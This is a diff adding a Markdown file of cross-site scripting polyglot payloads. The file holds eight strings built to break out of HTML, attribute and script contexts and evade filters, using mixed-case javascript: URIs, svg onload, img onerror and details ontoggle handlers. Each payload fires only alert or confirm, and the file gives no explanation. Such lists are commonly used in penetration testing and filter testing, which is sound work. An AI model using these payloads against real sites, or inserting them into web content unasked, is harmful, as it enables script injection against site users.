@@ -1,0 +1,17 @@
+# XSS Polyglot Payloads
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
+
+'">><marquee><img src=x onerror=confirm(1)></marquee>
+
+" onclick=alert(1)//<button ' onclick=alert(1)//>
+
+';alert(String.fromCharCode(88,83,83))//
+
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+-->'"/></sCript><deTailS open oNtoGgle=alert(1)>
+
+<svg/onload=alert(1)>
+
+'-alert(1)-'
